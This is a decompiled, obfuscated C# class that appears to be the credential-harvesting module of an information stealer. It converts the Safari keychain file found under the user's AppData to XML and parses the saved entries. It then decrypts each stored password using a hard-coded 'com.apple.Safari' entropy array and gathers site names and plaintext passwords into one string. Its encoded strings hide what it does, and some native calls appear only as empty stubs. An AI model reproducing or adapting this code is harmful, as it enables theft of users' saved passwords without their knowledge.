using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns4;

namespace ns8;

internal class Class33
{
	public class Class34
	{
		public struct Struct12
		{
			public int int_0;

			public IntPtr intptr_0;
		}

		public struct Struct13
		{
			public string string_0;

			public string string_1;

			public string string_2;

			public string string_3;

			public string string_4;

			public string string_5;

			public string string_6;

			public string string_7;

			public int int_0;

			public int int_1;

			public int int_2;

			public int int_3;
		}

		public static byte[] byte_0 = new byte[144]
		{
			29, 172, 168, 248, 211, 184, 72, 62, 72, 125,
			62, 10, 98, 7, 221, 38, 230, 103, 129, 3,
			231, 178, 19, 165, 176, 121, 238, 79, 15, 65,
			21, 237, 123, 20, 140, 229, 75, 70, 13, 193,
			142, 254, 214, 231, 39, 117, 6, 139, 73, 0,
			220, 15, 48, 160, 158, 253, 9, 133, 241, 200,
			170, 117, 193, 8, 5, 121, 1, 226, 151, 216,
			175, 128, 56, 96, 11, 113, 14, 104, 83, 119,
			47, 15, 97, 246, 29, 142, 143, 92, 178, 61,
			33, 116, 64, 75, 181, 6, 110, 171, 122, 189,
			139, 169, 126, 50, 143, 110, 6, 36, 217, 41,
			164, 165, 190, 38, 35, 253, 238, 241, 76, 15,
			116, 94, 88, 251, 145, 116, 239, 145, 99, 111,
			109, 46, 97, 112, 112, 108, 101, 46, 83, 97,
			102, 97, 114, 105
		};

		[SpecialName]
		private static string[] string_0;

		public static IntPtr smethod_0(IntPtr intptr_0)
		{
			IntPtr result = default(IntPtr);
			return result;
		}

		public static bool smethod_1(ref Struct12 struct12_0, string string_1, ref Struct12 struct12_1, IntPtr intptr_0, ref IntPtr intptr_1, int int_0, ref Struct12 struct12_2)
		{
			return false;
		}

		public static Struct13[] smethod_2()
		{
			Struct13[] result = default(Struct13[]);
			try
			{
				string string_ = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class6.smethod_0("dXeus6WIol+MoYWZsqJ5iaSrq5RapK+ynTl1r7akgpeguqGIol+ZrYmkrrisdaSru6yCoG2rsH4u", "False");
				string string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("mJjS2cehd6XYyKzM1s7NmKfUzsGhycfXvqHKvtTAtbrKysSqhdLVxK/LDA==", "False");
				string string_3 = null;
				if (!smethod_5(string_, string_2, ref string_3))
				{
					result = null;
					return result;
				}
				result = smethod_3(string_3.Remove(checked(string_3.Length - 2))).ToArray();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static List<Struct13> smethod_3(string string_1)
		{
			string input = File.ReadAllText(string_1);
			List<Struct13> list = new List<Struct13>();
			checked
			{
				try
				{
					int num = smethod_7(ref string_0, Regex.Split(Regex.Split(input, Class6.smethod_0("Wpq2vZ6Xdyo=", "False"))[1], Class6.smethod_0("XaCwsbRfJg==", "False"))).Length - 1;
					for (int i = 1; i <= num; i++)
					{
						Struct13 item = default(Struct13);
						item.string_0 = smethod_6(string_0[i], Class6.smethod_0("Y7XBxq+VqYsi", "False"), Class6.smethod_0("c4HQ2MigwMSiEw==", "False"), 0);
						item.int_1 = int.Parse(smethod_6(string_0[i], Class6.smethod_0("e8PT4MOmv9eqCw==", "False"), Class6.smethod_0("VmSpta1/nKW5dyw=", "False"), 0));
						item.string_6 = smethod_6(string_0[i], Class6.smethod_0("Y7XBxq+VqYsi", "False"), Class6.smethod_0("c4HQ2MigwMSiEw==", "False"), 1);
						item.string_1 = smethod_6(string_0[i], Class6.smethod_0("fsHJ48KABQ==", "False"), Class6.smethod_0("coDAxMmXjxI=", "False"), 0);
						item.string_3 = smethod_6(string_0[i], Class6.smethod_0("Y7XBxq+VqYsi", "False"), Class6.smethod_0("c4HQ2MigwMSiEw==", "False"), 2);
						item.string_4 = smethod_6(string_0[i], Class6.smethod_0("Y7XBxq+VqYsi", "False"), Class6.smethod_0("c4HQ2MigwMSiEw==", "False"), 3);
						item.string_5 = smethod_6(string_0[i], Class6.smethod_0("Y7XBxq+VqYsi", "False"), Class6.smethod_0("c4HQ2MigwMSiEw==", "False"), 4);
						item.int_2 = int.Parse(smethod_6(string_0[i], Class6.smethod_0("e8PT4MOmv9eqCw==", "False"), Class6.smethod_0("VmSpta1/nKW5dyw=", "False"), 1));
						item.int_0 = int.Parse(smethod_6(string_0[i], Class6.smethod_0("e8PT4MOmv9eqCw==", "False"), Class6.smethod_0("VmSpta1/nKW5dyw=", "False"), 2));
						item.string_7 = smethod_6(string_0[i], Class6.smethod_0("Y7XBxq+VqYsi", "False"), Class6.smethod_0("c4HQ2MigwMSiEw==", "False"), 5);
						item.int_3 = i - 1;
						item.string_2 = smethod_4(Convert.FromBase64String(item.string_1));
						list.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				return list;
			}
		}

		public void method_0()
		{
			try
			{
				Struct13[] array = smethod_2();
				Class33.string_0 = Class6.smethod_0("eZSfpph5lJ+mmHmUn6aYeZSfpph5lJ+mmHmUn6aYj7jIys2ld67YwqXF1aaYeZSfpph5lJ+mmHmUn6aYeZSfpph5lJ+mmHmUnw0=", "False");
				Struct13[] array2 = array;
				for (int i = 0; i < array2.Length; i = checked(i + 1))
				{
					Struct13 @struct = array2[i];
					Class33.string_0 = Class33.string_0 + Environment.NewLine + Class6.smethod_0("icK/08GVvL+bcxI=", "False") + @struct.string_0;
					Class33.string_0 = Class33.string_0 + Environment.NewLine + Class6.smethod_0("aJSxuK6HpaJ/Vy4=", "False") + @struct.string_2 + Environment.NewLine;
				}
				Class33.string_0 = Class33.string_0 + Environment.NewLine + Class6.smethod_0("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpAg=", "False");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static string smethod_4(byte[] byte_1)
		{
			checked
			{
				string result = default(string);
				try
				{
					int num = 0;
					IntPtr intPtr = Marshal.AllocHGlobal(byte_1.Length + 4);
					Marshal.Copy(byte_1, 0, intPtr, byte_1.Length);
					IntPtr intPtr2 = Marshal.AllocHGlobal(byte_0.Length);
					Marshal.Copy(byte_0, 0, intPtr2, byte_0.Length);
					Struct12 struct12_ = default(Struct12);
					struct12_.int_0 = byte_1.Length;
					struct12_.intptr_0 = intPtr;
					Struct12 struct12_2 = default(Struct12);
					struct12_2.int_0 = byte_0.Length;
					struct12_2.intptr_0 = intPtr2;
					IntPtr zero = IntPtr.Zero;
					IntPtr intptr_ = IntPtr.Zero;
					Struct12 struct12_3 = default(Struct12);
					if (!smethod_1(ref struct12_, null, ref struct12_2, zero, ref intptr_, 0, ref struct12_3))
					{
						result = null;
						return result;
					}
					Marshal.FreeHGlobal(intPtr);
					Marshal.FreeHGlobal(intPtr2);
					num = Marshal.ReadInt32(struct12_3.intptr_0);
					byte[] array = new byte[num + 1];
					ref IntPtr intptr_2 = ref struct12_3.intptr_0;
					intptr_2 = new IntPtr(struct12_3.intptr_0.ToInt32() + 4);
					Marshal.Copy(struct12_3.intptr_0, array, 0, num);
					smethod_0(struct12_3.intptr_0);
					char[] array2 = new char[num - 1 + 1];
					int num2 = num - 1;
					for (int i = 0; i <= num2; i++)
					{
						array2[i] = Strings.ChrW(unchecked((int)array[i]));
					}
					result = new string(array2);
					return result;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		public static bool smethod_5(string string_1, string string_2, ref string string_3)
		{
			bool result = default(bool);
			try
			{
				string_3 = null;
				if (!File.Exists(string_1))
				{
					result = false;
					return result;
				}
				Process process = new Process();
				process.StartInfo.FileName = string_1;
				process.StartInfo.Arguments = " -convert xml1 -s -o \"" + smethod_7(ref string_3, Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\fixed_keychain.xml\" ") + "\"" + string_2 + "\"";
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.UseShellExecute = false;
				process.Start();
				process.WaitForExit();
				result = process.StandardOutput.ReadToEnd().Length == 0;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string smethod_6(string string_1, string string_2, string string_3, int int_0)
		{
			string result = default(string);
			try
			{
				string input = Regex.Split(string_1, string_2)[checked(int_0 + 1)];
				result = Regex.Split(input, string_3)[0];
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static T smethod_7<T>(ref T gparam_0, T gparam_1)
		{
			T result = default(T);
			try
			{
				gparam_0 = gparam_1;
				result = gparam_1;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string string_0;
}
